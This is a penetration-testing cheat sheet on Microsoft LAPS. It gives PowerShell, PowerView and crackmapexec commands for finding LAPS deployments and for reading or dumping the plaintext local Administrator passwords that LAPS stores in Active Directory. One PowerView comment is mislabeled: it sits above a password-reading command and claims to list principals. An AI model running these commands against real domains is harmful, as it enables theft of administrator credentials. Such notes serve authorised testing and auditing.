**LAPS** allows you to manage the local **Administrator** password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.

When using LAPS, 2 new attributes appear in the computer objects of the domain: `ms-mcs-AdmPwd` and `ms-mcs-AdmPwdExpirationTime`. These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes.

# Check If Activated
```powershell
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```

# Other Commands
```powershell
# Get commands available
Get-Command *AdmPwd*

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```

## PowerView
**PowerView** can also be used to find out **who can read the password and read it**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```

# Dumping Credentials via crackmapexec
```bash
# LDAP
crackmapexec ldap <ip> -u <user> -p <password> -d <domain> -M laps

# SMB
crackmapexec smb <ip> -u <user> -p <password> --laps
```

# References
- [https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html)
